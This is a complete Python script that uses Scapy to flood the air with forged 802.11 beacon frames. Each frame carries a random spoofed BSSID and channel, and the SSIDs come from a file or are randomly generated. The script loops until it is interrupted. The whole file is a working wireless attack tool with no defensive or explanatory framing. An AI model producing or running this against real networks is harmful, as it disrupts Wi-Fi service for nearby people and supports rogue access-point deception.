import sys
import argparse
import random
import string
from scapy.all import *
import signal

def generate_random_ssid(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood_ssid_list(ssids, interface, count=1000):
    print("Flooding with the following SSIDs:")
    for ssid in ssids:
        print(f"  - {ssid}")

    print("\nPress Ctrl+C to stop flooding...")

    def signal_handler(sig, frame):
        print("\nFlooding stopped.")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        for ssid in ssids:
            bssid = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
            channel = random.randint(1, 13)  # Ensure channel is between 1 and 13
            pkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=chr(channel))
            sendp(pkt, iface=interface, verbose=False, count=count)

def main():
    parser = argparse.ArgumentParser(description="Flood the air with fake SSIDs")
    parser.add_argument('-i', '--interface', required=True, help="Wireless interface to use")
    parser.add_argument('-f', '--file', help="Text file containing a list of SSIDs, one per line")
    parser.add_argument('-n', '--number', type=int, help="Number of random SSIDs to generate if no file is provided")
    args = parser.parse_args()

    if not args.file and not args.number:
        sys.exit("You must provide either a file with SSIDs or the number of random SSIDs to generate.")

    if args.file:
        with open(args.file, 'r') as f:
            ssids = [line.strip() for line in f.readlines()]
    else:
        ssids = [generate_random_ssid() for _ in range(args.number)]

    flood_ssid_list(ssids, args.interface)

if __name__ == '__main__':
    main()
